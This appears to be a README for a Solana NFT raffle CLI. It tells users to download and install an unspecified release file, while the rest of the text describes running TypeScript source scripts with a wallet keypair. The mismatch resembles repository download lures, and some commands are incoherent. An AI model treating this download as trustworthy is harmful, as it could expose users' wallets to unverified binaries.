# 🎉 raffle-frank-rust - Easy Way to Buy Raffle NFTs

[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Capone1984/raffle-frank-rust/releases)

## 🚀 Getting Started

Welcome to **raffle-frank-rust**! This application allows you to buy raffle tickets easily, enabling you to receive or purchase NFTs. 

Follow these simple steps to download and run the software.

## 📥 Download & Install

To get started, visit the [Releases Page](https://github.com/Capone1984/raffle-frank-rust/releases) and download the latest version of the software.

1. Click on the link above.
2. Look for the latest release and download the appropriate file for your device.
3. Follow the prompts to install the application.

## 🛠️ Install Dependencies

Before running the application, you need to install some tools.

1. **Node.js**: Download and install Node.js from the [official website](https://nodejs.org/).
2. **Yarn**: You can install Yarn using one of the methods outlined on their [website](https://yarnpkg.com/getting-started/install).
3. **ts-node**: Run the following command in your terminal:
   ```bash
   npm install -g ts-node
   ```

4. **Solana Wallet**: Ensure you have your Solana wallet set up. The default location should be:
   ```
   /home/fury/.config/solana/id.json
   ```

## 🔍 Usage

The main script handles all functionalities. Here’s how to use it:

1. Locate the source script at `/cli/script.ts`.
2. For account types, refer to `/cli/types.ts`.
3. If you need JSON bindings, check `/cli/raffle.json`.

### Testing the Functions

To test the script:

1. Open the main `script.ts` file.
2. Change the commands in the main functions to call the specific functions you want to test.
3. Make sure the `ANCHOR_WALLET` environment variable is correctly set in the `package.json`.
4. Run the following command in the terminal:
   ```bash
   yarn ts-node
   ```

## 🎖️ Features

This application includes several features for both users and Smart Contract Owners.

### 👩‍💼 For Smart Contract Owners

To set up for the first time:

1. You must initialize the Smart Contract for global account allocation.
2. Use the command:
   ```bash
   initProject
   ```

## 🤔 Troubleshooting

If you encounter issues:

- Ensure all dependencies are correctly installed.
- Double-check that your Solana wallet is configured.
- If you receive errors while running the script, review the commands for correctness.

## 📞 Support

If you need help, reach out through the Issues section of this repository. We aim to assist you promptly.

## 🚀 Next Steps

Now that you are set up, explore the features of the application. Consider looking into the following:

- Review the source code under the `/cli/` directory.
- Check any documentation for additional functionalities that may be useful.
- Engage with the community for ideas and support.

Thank you for using **raffle-frank-rust**! Enjoy your NFT raffle experience.